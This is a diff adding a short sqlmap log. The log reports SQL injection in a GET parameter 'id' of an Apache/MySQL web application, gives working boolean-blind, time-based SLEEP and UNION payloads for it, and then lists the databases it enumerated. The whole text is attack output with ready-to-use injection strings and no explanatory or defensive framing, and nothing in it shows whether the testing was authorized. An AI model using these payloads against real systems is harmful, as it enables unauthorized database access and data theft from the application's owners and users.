@@ -1,0 +1,21 @@
+sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=70 AND 7328=7328
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=70 AND (SELECT 4618 FROM (SELECT(SLEEP(5)))llvr)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=-7907 UNION ALL SELECT NULL,CONCAT(0x7171706271,0x70484773485a6a6259425874464d4a5442686779594c626e58466b6256504c61764e69426e547a78,0x7171767871)-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] d04144kxdb1
+[*] information_schema
+
